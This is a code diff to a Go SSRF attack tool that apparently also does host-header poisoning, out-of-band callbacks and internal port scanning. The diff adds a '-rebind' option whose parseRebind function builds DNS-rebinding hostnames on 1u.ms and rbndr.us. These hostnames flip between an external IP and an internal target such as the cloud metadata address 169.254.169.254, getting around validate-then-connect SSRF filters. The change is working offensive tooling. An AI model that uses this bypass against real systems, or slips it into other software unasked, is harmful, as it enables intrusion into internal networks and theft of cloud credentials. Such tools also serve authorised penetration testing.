@@ -61,6 +61,7 @@ type config struct {
 	evil             string
 	itarget          string
 	sweep            string
+	rebind           string
 	ports            string
 	scanHost         string
 	path             string
@@ -202,6 +203,10 @@ SCOPE / PAYLOADS:
                     "1-1024". Ranges are reordered to try well-known and round
                     dev ports (80,443,3306,6379,3000,8000,8080...) first. Open
                     ports stand out as rare clusters in the summary.
+  -rebind <ips>     DNS rebinding bypass for TOCTOU filters (validate-then-connect):
+                    "ext:int" (e.g. 1.2.3.4:169.254.169.254) or just "int" with
+                    ext defaulting to 1.2.3.4. Builds alternating-DNS hosts via
+                    1u.ms and rbndr.us and adds them as SSRF targets.
   -scan-host <host> Host to port-scan with -ports (default 127.0.0.1). Combine
                     -ports with -sweep instead to scan a whole network (every
                     swept IP x each port).
@@ -325,6 +330,7 @@ func parseFlags() *config {
 	flag.StringVar(&cfg.evil, "evil", "", "value for {{EVIL}} host poisoning (else OOB)")
 	flag.StringVar(&cfg.itarget, "itarget", "127.0.0.1", "value for {{TARGET}} internal address")
 	flag.StringVar(&cfg.sweep, "sweep", "", "last-octet /24 sweep: 'private' or custom list like '10.10.10,192.168.56'")
+	flag.StringVar(&cfg.rebind, "rebind", "", "DNS rebinding bypass: 'ext:int' IPs, or 'int' (ext defaults 1.2.3.4); builds 1u.ms/rbndr.us hosts")
 	flag.StringVar(&cfg.ports, "ports", "", "post-SSRF scan: port spec 'top', CSV '80,6379', or range '1-1024' (ssrf mode)")
 	flag.StringVar(&cfg.scanHost, "scan-host", "", "post-SSRF scan: host to port-scan (default 127.0.0.1; or use -sweep for a network scan)")
 	flag.StringVar(&cfg.path, "path", "", "host mode: single request path to use (e.g. /admin), overrides the request path")
@@ -484,7 +490,11 @@ func run(cfg *config) error {
 			scanHosts = []string{"127.0.0.1"}
 		}
 	}
-	params := gen.Params{LHOST: cfg.lhost, TARGET: cfg.itarget, EVIL: cfg.evil, HOST: sni, Sweep: parseSweep(cfg.sweep), ScanHosts: scanHosts, Ports: ports}
+	rebindHosts, err := parseRebind(cfg.rebind, cfg.itarget)
+	if err != nil {
+		return err
+	}
+	params := gen.Params{LHOST: cfg.lhost, TARGET: cfg.itarget, EVIL: cfg.evil, HOST: sni, Sweep: parseSweep(cfg.sweep), ScanHosts: scanHosts, Ports: ports, Rebind: rebindHosts}
 
 	sopts := sender.Options{
 		DialAddr: dialAddr, TLS: useTLS, Proxy: cfg.proxy, TargetHost: targetHost,
@@ -1142,6 +1152,39 @@ func meanStd(ds []time.Duration) (mean, std time.Duration) {
 	}
 	variance /= float64(len(ds))
 	return time.Duration(m), time.Duration(math.Sqrt(variance))
+}
+
+func parseRebind(s, itarget string) ([]string, error) {
+	s = strings.TrimSpace(s)
+	if s == "" {
+		return nil, nil
+	}
+	ext, intip := "1.2.3.4", itarget
+	if s != "default" && s != "on" {
+		if i := strings.IndexByte(s, ':'); i >= 0 {
+			ext, intip = strings.TrimSpace(s[:i]), strings.TrimSpace(s[i+1:])
+		} else {
+			intip = s
+		}
+	}
+	if net.ParseIP(ext).To4() == nil || net.ParseIP(intip).To4() == nil {
+		return nil, fmt.Errorf("-rebind needs IPv4 addresses (got ext=%q int=%q)", ext, intip)
+	}
+	hosts := []string{fmt.Sprintf("make-%s-rebind-%s-rr.1u.ms", ext, intip)}
+	if he, ok1 := ipv4Hex(ext); ok1 {
+		if hi, ok2 := ipv4Hex(intip); ok2 {
+			hosts = append(hosts, he+"."+hi+".rbndr.us")
+		}
+	}
+	return hosts, nil
+}
+
+func ipv4Hex(s string) (string, bool) {
+	ip := net.ParseIP(s).To4()
+	if ip == nil {
+		return "", false
+	}
+	return fmt.Sprintf("%02x%02x%02x%02x", ip[0], ip[1], ip[2], ip[3]), true
 }
 
 func parseSweep(s string) []string {
